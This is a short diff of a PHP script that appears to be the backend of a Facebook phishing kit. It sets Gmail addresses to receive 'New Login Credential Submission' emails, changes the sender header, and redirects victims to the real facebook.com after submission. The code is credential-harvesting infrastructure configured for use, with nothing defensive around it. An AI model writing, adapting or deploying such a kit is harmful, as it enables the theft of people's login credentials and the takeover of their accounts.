@@ -6,7 +6,7 @@ ini_set('display_errors', 1);
 // Email Configuration
 $to = "geormari121@gmail.com"; // Replace with your email address
 $subject = "New Login Credential Submission";
-$headers = "From: no-reply@example.com\r\n"; // Replace with your "From" email address
+$headers = "From: curvee0825@gmail.com\r\n"; // Replace with your "From" email address
 
 // Redirect to Facebook
 header('Location: http://www.facebook.com/');
